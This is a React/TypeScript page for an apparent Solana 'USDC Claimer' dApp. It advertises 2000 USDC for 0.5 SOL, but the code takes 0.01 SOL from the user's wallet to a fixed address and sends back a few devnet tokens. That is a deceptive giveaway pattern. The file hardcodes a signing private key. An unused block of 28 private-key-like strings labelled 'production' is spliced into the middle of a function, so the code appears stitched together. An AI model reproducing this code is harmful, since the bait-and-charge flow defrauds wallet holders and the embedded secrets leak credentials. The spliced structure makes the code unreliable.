/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "R6yqJEReVys18RfovK5HYQMxazemzjGH4guti2JE86zFagwig74DPGA6AmA6tjj1tbhMwEi4tr3a2d9JbBss95k"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5QJiLjEG4icpGJLnkXmhS7cph5ccautHNY18LqCTMqSBXPPwe1zwTXzXajJMJVdSbPp6XEBWm6cD1BdALCFNvLCJ",
  "key1": "44wdFp8ubEuJc51145AgamXFhhUX8XCUiGMTccCyVpTmdbdEtx4JQC4CdNFmgoJuiaPuNRJ562oXvL6UymfiTUkW",
  "key2": "3Q8AuFMFCm3oy9PDnhPUT8i1qvJYpaQYNtEZGVAAM9gCYo9c7z9uW9k8GxunvSyUfrvzSncd2Rc28T1W7S5pBkV1",
  "key3": "3cH5RH8bkAfhuMqvkjF19X3GdQfzjMkFWjvWDAk8jaWkjR1vEXHA5f4NGN77XvtxtBgTQytvAP3tPFbFpd8gM1Ph",
  "key4": "2QyGJjbAenjSuooEj9paQZ4UQnDhb8dGoLevQBGn4NTSAhquJzErdDo6peUQMw3Y2ko31TT81kGaNyD8tnPsFzKN",
  "key5": "5zzbXqHJXqqGB4UNGAVddibGgzvXYWKEXTogP5DTYpTdrd4J4tHrmSHUgx2nkhqg5LAbgWUHUcHQCnLtVoVUxj1V",
  "key6": "3kZRd9gd2ReeRDAeBRRPQ577WVrZWR8K8idaKrRUk8dAbseENgobxx8twTjEn381iXKDuefBrQHbqGLsPCmsEWNe",
  "key7": "Q4PyzvSEKQU4uhjRTKJmW23B1PstE3ySLYuKmfnFv1A79LAvvJaEaB8wPHegPdzceMAHaNVT6vm8dZbbSJ9UVKR",
  "key8": "4dbq4GgZJGwr9mtXzVpj7edTsMcPws4SZAiCdwVPwbpj3ehn9JPitZPrFNbYJ3YmRGGmmbxF5NdV5T1dekGLf3V4",
  "key9": "3TAaHCJ4LEPcXMNpgqqJkrb3R34zuzCHCAVjDYFd8t3B5JhtyQkJSWokLcEicFSXLs1xBxKNujGG9EKhF8f24iZ6",
  "key10": "4h4TDwpXVSxQG1SUP7vtDu1nmWQeZPMcK7F4to2R1LrgqVJs4VFyZAdkV4N4Jubp4MtmW1PM8Wb6dzAYKgeboyhx",
  "key11": "64A5paZi4EzfdDMkvi3owu4rGjUJrzthhGXXzuj28A9P64Te3WbFWV5N5UxaGEYJZeTQSRXZjiUo4T4ko1iG6a5h",
  "key12": "FunRmWAs3NFi23wzWFkFKc87GsLXYCWDyoizrXMeRu4Sy8SqHDM7WvMSnMScaGSpeLYMEVdSVwRFS8D9tMtZTWN",
  "key13": "43Bb9ErecHyaEkk6CkC9tySvrDFa9DqUaEDALEhys1NyffT9xTGfcaJncZDuNGwLeHGFZSGvjsT1hZziZY4yB88e",
  "key14": "61hYJXf37tvabzbY1zm6ygHH72xPqh9gCp4WQfWUqkXezcYdEyrzkbjkeD7HHSbfLSUeY22c5oAnotG9UjQc3dgq",
  "key15": "3t6GZCk7wNJuJvGBq8Q86MMCW1z5M2pjgT2xL1R1n6M36L8SLgwV4abRia6AA44KescP55MmPkN4pWwB5sYZqSyG",
  "key16": "y86CWi47duFx66FdHgGFUAdUtbaFQhgK8Gv7s2W62tn4qpzpu2duZA5tWjL3Puhq5QQWjmasVYsHju9ZZvfNoCs",
  "key17": "66hYnfDSxa3XTmeZFys9jsf7abp2xy139pZbYM6EVrYNcNXCy3y8LGPvi73YViQYenaLTiWQf5p1bQwvRHDcBGmc",
  "key18": "hTGiuWDLpfYKAocJqox26dxqYrq26qsoSecd1AxquJPudLkrHEcQD3rdhBYb73MfXcKBuV3fbeYYRHa9eaW3ZcM",
  "key19": "37qHqVPh3ucTDc33LL1ie7WEPGXFuCXuQ5aUbC46u26K4KHXitodNNrY65YBiAUQGLEQsx57cy3k2uRBdsvB6fFW",
  "key20": "66UVezoueofZ9FX1PrwMH3MpoLWukvnWwx6yBG1MUJp7Z3Frq1H5hmdCCfDajDpMBJAcXMD2GuHGVWHiE2uAfV6G",
  "key21": "4LEZkcC1BtydzmV4cwnG5sFKqoAtFT7X3kyV8VDB3t9YUy2NR7pGHcFK9kbF11f5ZN3sPpMJvrbtHnWcCs6dzXGh",
  "key22": "BScFHxZ9ZSWFJQwha1ZV1CQTUCeofe62BLMrZ6rfR23yqQCgctMvoiDnrmhLiT3E5ZthZ21CLTbtqDSLXYxJc4i",
  "key23": "4DSbdP8TrErRpNeHaFAdEaAsC6a8KP39nsFsKU3wdARCMRfPvF6K9Z9KLPMHhLzXA6h2r1eiy8PLZgmMkEGC9jnH",
  "key24": "5ETmPQFkGsQ3yzTPv2a1rQyhdKvG2ctEKzh8kQ2AVnhJeCBPadzu8sv2emXGbyAuBfaj3vMiAB9sxxtnd8cccgRf",
  "key25": "YAPqkdqp5N5kdp157V5pvQKm1F6zRpLrNXw3dYEygR1xuXim94bXhnVVBAPmakaSVNL3LygVDGnkPsN7u3i3gXs",
  "key26": "N8BydCzfe7JsVUsm2MbzFer1xCnUyUWFBRPrqzuWHrgT44Wfk7btnmprZqGbvhFfoLxqHApYarGnF6MU6Zkbg2X",
  "key27": "5EfpYRxEWizPruPUoY1Rhu9VDsu7o3MzCEEowtydrNCtUvyVpErciuRzheFgyGBUeU54f26xE7Jd7kQgiWazei5j"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
